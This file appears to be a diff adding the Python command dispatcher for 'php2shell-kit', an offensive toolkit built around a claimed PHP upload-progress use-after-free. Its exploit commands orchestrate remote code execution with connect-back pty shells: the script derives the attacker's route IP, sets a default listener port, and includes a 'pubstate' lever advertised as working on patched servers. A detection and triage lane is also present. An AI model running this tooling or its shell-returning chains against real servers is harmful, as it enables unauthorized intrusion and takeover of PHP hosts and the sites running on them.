@@ -1,0 +1,307 @@
+#!/usr/bin/env python3
+"""kit — php2shell-kit dispatcher (CVE-2026-109618/109619 + staleness).
+
+One entry point over the tier scripts. The dispatcher adds NO new probe
+behavior: it resolves paths, derives connect-back env, prints each step it
+takes (colorized), and hands off to the tier script, which keeps its own
+rich output and exit-code contract (0 clean/fixed, 2 vulnerable, 3 n/a).
+The detect sweep runs BOTH questions in one pass — the official CVE pair
+and our staleness — because a vendor-patched CVE lane alone can read as
+"nothing is exploitable" when our lever keeps the box live.
+
+  kit                                   help
+  kit detect   --php-bin B | --url U    client checker (detect/ tier)
+  kit prove    staleness [opts]         frozen-counter signature leg
+  kit prove    cve618|cve619            vendor-shape arm, local build
+  kit prove    arm --target ip:port     vendor-shape arm, live venue
+  kit exploit  staleness host[:port]    UAF chain RCE (pty shell default)
+  kit exploit  pubstate  host[:port]    stock-config lever shell
+  kit exploit  aio TARGET [cells...]    php2shell AIO cells
+  kit exploit  wp BASE --path P         consumer-app census
+  kit bench    serve [mode]             local php -S harness (setarch -R)
+  kit triage   --php-bin B | --url U    full ladder -> one-page report
+  kit targets                           regime knowledge + your lab map (targets/*.md)
+  kit versions                          known php builds on this box
+
+Run `kit <cmd> --help` to reach the tier script's own help.
+"""
+import os, subprocess, sys
+
+ROOT = os.path.dirname(os.path.abspath(__file__))
+DETECT  = os.path.join(ROOT, 'detect',  'detect.py')
+STALE   = os.path.join(ROOT, 'prove',   'staleness.py')
+CVE     = os.path.join(ROOT, 'prove',   'cve_shape.py')
+UAF     = os.path.join(ROOT, 'exploit', 'uaf.py')
+PUB     = os.path.join(ROOT, 'exploit', 'pubstate.py')
+AIO     = os.path.join(ROOT, 'exploit', 'php2shell.py')
+SERVE   = os.path.join(ROOT, 'bench',   'serve.sh')
+PROJ    = os.environ.get('PHP2SHELL_PROJ') or os.path.expanduser('~/.local/share/php-session-uaf')
+
+def color_on():
+    return (sys.stdout.isatty() and not os.environ.get('NO_COLOR')
+            and os.environ.get('TERM') != 'dumb')
+
+C = color_on()
+def paint(code, s):
+    return ('\033[%sm%s\033[0m' % (code, s)) if C else s
+
+BOLD, CYAN, RED, GREEN, YELLOW, DIM, MAG = ('1', '36', '31', '32', '33', '2', '35')
+def head(s):  return paint(BOLD + ';' + CYAN, s)
+def step(i, n, s):  return paint(CYAN, '▸') + ' ' + paint(DIM, '[%d/%d]' % (i, n)) + ' ' + paint(BOLD, s)
+def verdict_words(rc):
+    return {0: paint(GREEN, 'CLEAN/FIXED'), 2: paint(RED, 'VULNERABLE'),
+            3: paint(YELLOW, 'NO-TRIGGER/NA')}.get(rc, paint(RED, 'ERROR rc=%d' % rc))
+
+def rule(title):
+    line = '─' * max(4, min(72, 72 - len(title) - 6))
+    return '\n' + head('┌ ' + title + ' ' + line)
+
+def run(script, args, env_extra=None, interpreter=None):
+    cmd = ([interpreter or sys.executable, script] if not script.endswith('.sh')
+           else ['bash', script]) + list(args)
+    env = dict(os.environ)
+    env.update(env_extra or {})
+    return subprocess.run(cmd, env=env).returncode
+
+def execv(script, args, env_extra=None):
+    """Replace the process: interactive legs (pty shells) keep raw stdio."""
+    env = dict(os.environ); env.update(env_extra or {})
+    argv = ['bash', script] if script.endswith('.sh') else [sys.executable, script]
+    os.execvpe(argv[0], argv + list(args), env)
+
+def split_opts(argv, known_flags_with_value=()):
+    """Return (ours, passthrough): ours consumes --target/--php-bin/--port/--mode/--app;
+    everything else forwards to the tier script untouched."""
+    ours, rest = {}, []
+    i = 0
+    take = ('--target', '--php-bin', '--port', '--mode', '--app') + tuple(known_flags_with_value)
+    while i < len(argv):
+        a = argv[i]
+        if a in take and i + 1 < len(argv):
+            ours[a[2:]] = argv[i + 1]; i += 2
+        else:
+            rest.append(a); i += 1
+    return ours, rest
+
+def parse_hostport(hostport, default_port=80):
+    if ':' in hostport:
+        h, p = hostport.rsplit(':', 1)
+        return h, int(p)
+    return hostport, default_port
+
+def rhost_for(target_host):
+    """Our IP on the route to the target — rides in-band, zero env on target."""
+    import socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect((target_host, 80)); return s.getsockname()[0]
+    except OSError:
+        return '127.0.0.1'
+
+def need(value, flag):
+    if not value:
+        print(paint(RED, '✗') + ' missing %s' % flag); sys.exit(4)
+
+# ── commands ────────────────────────────────────────────────────────────────
+
+def cmd_detect(rest):
+    print(rule('detect · one sweep, three lanes — exit code = verdict'))
+    print('  ' + step(1, 3, 'lane A · vendor CVE pair — lineage + config gate (+ --probe for the behavioral arm)'))
+    print('  ' + step(2, 3, 'lane B · OUR staleness — frozen-counter readback via app.php beside the detector (needs --url)'))
+    print('  ' + step(3, 3, 'lane C · pubstate lever — the stock-config door; PATCHED CVE ≠ armed lever'))
+    execv(DETECT, rest)
+
+def cmd_prove(rest):
+    leg = rest[0] if rest and not rest[0].startswith('-') else None
+    opts = rest[1:] if leg else rest
+    ours, pass_ = split_opts(opts, known_flags_with_value=('--url', '--rhost', '--lport'))
+    if leg in ('staleness', None):
+        t = ours.get('target'); need(t, '--target ip:port')
+        h, p = parse_hostport(t)
+        env = {'TARGET_HOST': h, 'EXP_PORT': str(p), 'MODE': ours.get('mode', 'exploit')}
+        if 'app' in ours: env['APP_PATH'] = ours['app']
+        if h not in ('127.0.0.1', 'localhost', '::1'):
+            env['RHOST'] = os.environ.get('RHOST') or rhost_for(h)
+        print(rule('prove · staleness — frozen-counter signature on a live venue'))
+        print('  ' + step(1, 1, 'R1 plant → R2 spray → R3 read-back vs %s:%s%s' % (h, p, '  app=' + ours['app'] if 'app' in ours else '')))
+        print('  ' + paint(DIM, '  (exit 2 = lever live — the vendor patch never touched this leg)'))
+        execv(STALE, [env['MODE']], env_extra=env)
+    elif leg in ('cve618', 'cve619', 'patched618', 'patched619', 'reliability'):
+        if 'url' in ours:
+            die('cve618/cve619 are LOCAL-build arms (--php-bin). For a live venue discriminator use: kit prove arm --target ip:port')
+        b = ours.get('php-bin', 'php')
+        print(rule('prove · %s — vendor-shape arm against local build %s' % (leg, b)))
+        print('  ' + step(1, 2, 'spin php -S + detector.php (harness ini, labeled)'))
+        print('  ' + step(2, 2, 'OOM arm: silent 500 = pre-patch · visible fatal = post-patch'))
+        execv(CVE, [leg], env_extra={'PHP_BIN': b})
+    elif leg == 'arm':
+        t = ours.get('target'); need(t, '--target ip:port')
+        print(rule('prove · remote 618 arm — %s' % t))
+        print('  ' + step(1, 1, 'vendor discriminator against live venue (detector.php deployed)'))
+        env = {'TARGET': t, 'RSHELL_LPORT': ours.get('lport') or os.environ.get('RSHELL_LPORT', '4477')}
+        thost = t.split(':')[0]
+        if thost not in ('127.0.0.1', 'localhost', '::1'):
+            env['RHOST'] = ours.get('rhost') or os.environ.get('RHOST') or rhost_for(thost)
+        execv(CVE, ['remote'], env_extra=env)
+    else:
+        die_prove()
+
+def cmd_exploit(rest):
+    leg = rest[0] if rest and not rest[0].startswith('-') else None
+    opts = rest[1:] if leg else rest
+    ours, pass_ = split_opts(opts)
+    tgt = ours.get('target')
+    if not tgt and pass_ and not pass_[0].startswith('-') and ':' in pass_[0]:
+        tgt = pass_.pop(0)          # consume the bare host:port, don't duplicate it
+    if leg == 'staleness':
+        if tgt: pass_.insert(0, tgt)
+        print(rule('exploit · staleness chain — uaf.py (pty shell default)'))
+        print('  ' + step(1, 1, 'R1 plant · R2 spray-freeze · R3 dial-back shell to us'))
+        execv(UAF, pass_)
+    elif leg == 'pubstate':
+        if tgt: pass_.insert(0, tgt)
+        print(rule('exploit · pubstate lever — pubstate.py (stock config, survives the patch)'))
+        print('  ' + step(1, 1, 'paced plant → abandoned upload → frozen entry → dial-back'))
+        execv(PUB, pass_)
+    elif leg in ('aio', 'wp'):
+        if leg == 'wp':
+            print(rule('exploit · consumer-app census — php2shell --wp'))
+        else:
+            print(rule('exploit · php2shell AIO — probe → arm → rce cells'))
+        execv(AIO, pass_)
+    else:
+        die_exploit()
+
+def cmd_bench(rest):
+    mode = rest[-1] if rest and not rest[-1].startswith('-') else 'exploit'
+    ours, _ = split_opts(rest[:-1] if rest and rest[-1] == mode else rest)
+    env = {}
+    if 'port' in ours: env['EXP_PORT'] = ours['port']
+    if 'target' in ours: env['TARGET'] = ours['target']
+    print(rule('bench · local php -S harness — setarch -R, single worker'))
+    print('  ' + step(1, 1, 'mode=%s · %s' % (mode, os.path.relpath(SERVE, ROOT))))
+    execv(SERVE, [mode], env_extra=env)
+
+def cmd_triage(rest):
+    ours, _ = split_opts(rest, known_flags_with_value=('--url', '--app'))
+    b, u = ours.get('php-bin'), ours.get('url')
+    if not b and not u:
+        die_triage()
+    print(rule('triage · php2shell-kit full ladder'))
+    kid = dict(os.environ, PYTHONUNBUFFERED='1')   # keep parent step lines and child output in order
+    results = []
+    if b:
+        print('  ' + step(1, 3, 'lineage — %s' % b))
+        try:
+            ver = subprocess.run([b, '-r', 'echo PHP_VERSION." | ".php_sapi_name();'],
+                                 capture_output=True, text=True, timeout=15)
+            print('      ' + (ver.stdout.strip() or paint(RED, 'not a php binary?')))
+        except Exception as e:
+            print('      ' + paint(RED, 'cannot run: %s' % e)); sys.exit(4)
+        print('  ' + step(2, 3, 'detect ladder — lineage + config gate + staleness/chain tiers'))
+        results.append(('detect', subprocess.run(
+            [sys.executable, DETECT, '--php-bin', b] + ([ '--color'] if C else []),
+            env=kid).returncode))
+        print('  ' + step(3, 3, 'vendor 618 arm on this build — behavioral override'))
+        results.append(('cve-arm', subprocess.run(
+            [sys.executable, CVE, 'stock618'],
+            env=dict(os.environ, PHP_BIN=b)).returncode))
+    else:
+        print('  ' + step(1, 1, 'detect sweep against live venue — CVE pair + staleness + lever, one pass'))
+        results.append(('detect', subprocess.run(
+            [sys.executable, DETECT, '--url', u, '--probe'] + (['--color'] if C else []),
+            env=kid).returncode))
+        print('  ' + paint(DIM, '  (the sweep already covers vendor CVE + our staleness; full spray battery: `kit prove staleness`)'))
+    print('\n' + head('└ ladder summary'))
+    for name, rc in results:
+        print('  %s: %s' % (name.ljust(10), verdict_words(rc)))
+    print('  ' + paint(DIM, 'probe beats lineage: a VULN here survives any distro changelog'))
+    print('  ' + paint(DIM, 'and a CLOSED vendor pair ≠ safe: the staleness lane rides the same sweep'))
+    sys.exit(max(rc for _, rc in results) if results else 3)
+
+def cmd_targets(_):
+    for f in sorted(os.listdir(os.path.join(ROOT, 'targets'))):
+        if f.endswith('.md'):
+            print(open(os.path.join(ROOT, 'targets', f)).read().rstrip() + '\n')
+
+def cmd_versions(_):
+    print(rule('php builds known to the kit (this box)'))
+    import glob
+    cands = []
+    for pat in ('/usr/bin/php[0-9.]*', '/usr/local/bin/php[0-9.]*',
+                '/usr/bin/php', '/usr/local/bin/php'):
+        cands += [('system', p) for p in glob.glob(pat)]
+    cands += [('build tree', p) for p in sorted(glob.glob(
+                  os.path.join(PROJ, 'php-*/sapi/cli/php')))]
+    rows = []
+    for tag, path in cands:
+        if os.path.exists(path) and os.path.realpath(path) not in {
+                os.path.realpath(p) for _, p in rows}:
+            rows.append((tag, path))
+    if not rows:
+        print('  ' + paint(DIM, 'no php found — install php on PATH, or set '
+                                'PHP2SHELL_PROJ=<dir holding php-*/ source trees>'))
+        return
+    for tag, path in sorted(rows, key=lambda r: r[1]):
+        v = subprocess.run([path, '-r', 'echo PHP_VERSION;'],
+                           capture_output=True, text=True).stdout.strip()
+        verdict = {'8.3.6': paint(RED, 'VULN'), '8.3.36': paint(GREEN, 'FIXED'),
+                   '8.5.12': paint(GREEN, 'FIXED')}.get(v, '')
+        loc = 'distro' if tag == 'system' else os.path.basename(os.path.dirname(os.path.dirname(path)))
+        print('  %-10s %-8s %-10s %s' % (tag, v, loc, path + ('  ← ' + verdict if verdict else '')))
+    print('  ' + paint(DIM, 'verdicts are cached hints — the kit re-proves, never trusts'))
+    if not os.environ.get('PHP2SHELL_PROJ'):
+        print('  ' + paint(DIM, 'tip: PHP2SHELL_PROJ=<dir with php-*/ trees> adds build-tree php binaries here'))
+
+def help_text():
+    t = []
+    t.append(head('php2shell-kit') + ' — PHP upload-progress UAF: detect → prove → exploit → bench')
+    t.append(paint(DIM, 'CVE-2026-109618/619 + frozen-counter staleness · stdlib python3 · exit code = verdict'))
+    t.append(paint(DIM, 'the detect sweep always asks both questions: official CVE pair AND our staleness'))
+    t.append('')
+    for line, desc in [
+        ('kit detect   --php-bin B | --url U [--probe]', 'one sweep: CVE pair + staleness + lever'),
+        ('kit prove    staleness --target ip:port', 'frozen-counter signature on a live venue'),
+        ('kit prove    cve618|cve619 [--php-bin B]', "vendor regression-shape arm (local build)"),
+        ('kit prove    arm --target ip:port', 'vendor discriminator against a live venue'),
+        ('kit exploit  staleness host[:port]', 'UAF chain → pty shell over connect-back'),
+        ('kit exploit  pubstate  host[:port]', 'stock-config lever shell (patched venues)'),
+        ('kit exploit  aio|--wp ...', 'AIO cells · consumer-app census'),
+        ('kit bench    serve [mode]', 'local setarch -R php -S harness'),
+        ('kit triage   --php-bin B | --url U', 'full ladder → colored summary'),
+        ('kit targets | kit versions', 'regime + lab notes · php builds found on this box'),
+    ]:
+        t.append('  ' + paint(MAG, line.ljust(50)) + desc)
+    t.append('')
+    t.append(paint(DIM, 'tier scripts run raw: `kit <cmd> … --help` reaches each script\'s own flags'))
+    return '\n'.join(t)
+
+def die(msg):
+    print(paint(RED, '✗ ') + msg + '\n'); print(help_text()); sys.exit(4)
+def die_prove():    die('prove needs a leg: staleness | cve618 | cve619 | arm | reliability')
+def die_exploit():  die('exploit needs a leg: staleness | pubstate | aio | wp')
+def die_triage():   die('triage needs --php-bin PATH (CLI box) or --url http://…/detector.php')
+
+def main():
+    args = sys.argv[1:]
+    cmd = args[0] if args and not args[0].startswith('-') else None
+    if cmd in (None, 'help', '-h', '--help'):
+        print(help_text()); sys.exit(0)
+    rest = args[1:]
+    if rest == ['-h'] or rest == ['--help']:   # reach the tier script's own help
+        return _tier_help(cmd, rest)
+    {'detect': cmd_detect, 'prove': cmd_prove, 'exploit': cmd_exploit,
+     'bench': cmd_bench, 'triage': cmd_triage, 'targets': cmd_targets,
+     'versions': cmd_versions}.get(cmd, lambda r: die('unknown command: %s' % cmd + '\n'))(rest)
+
+def _tier_help(cmd, _):
+    script = {'detect': DETECT, 'prove': CVE, 'exploit': AIO}.get(cmd)
+    if not script:
+        print(help_text()); sys.exit(0)
+    if cmd == 'prove':
+        subprocess.run([sys.executable, CVE, '-h'])
+    else:
+        subprocess.run([sys.executable, script, '-h'])
+
+if __name__ == '__main__':
+    main()
